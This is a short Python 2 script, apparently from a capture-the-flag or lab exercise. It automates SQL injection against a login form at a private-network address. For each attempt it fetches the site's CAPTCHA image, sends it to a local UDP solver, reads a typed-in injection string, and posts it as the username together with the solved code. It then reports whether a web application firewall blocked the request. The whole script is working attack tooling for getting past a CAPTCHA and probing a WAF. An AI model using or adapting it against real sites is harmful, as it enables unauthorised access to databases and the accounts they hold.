#coding:utf-8
import requests
import socket
import StringIO
from PIL import Image
while True:
    session = requests.session()
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    verify = session.get('http://192.168.34.36/ckstr.php', stream=True)
    imgBuf = StringIO.StringIO(verify.content)
    img = Image.open(imgBuf)
    w, h = img.size
    img.thumbnail((w/5, h/5))
    img.save('111.jpg', 'jpeg')
    with open('111.jpg', 'rb') as f:
        s.sendto(f.read(), ('localhost',14250))
        code =  s.recvfrom(65500)
        yzm = code[0]
        print('yzm', yzm)
    yuju = raw_input("sqli: ")
    r = session.post('http://192.168.34.36/index.php', data={'uname': yuju, 'pwd': '123123', 'yzm': yzm})
    if '1.gif' in r.text:
        print 'waf!!!!!!!!'
    else:
        print r.text[-50:]
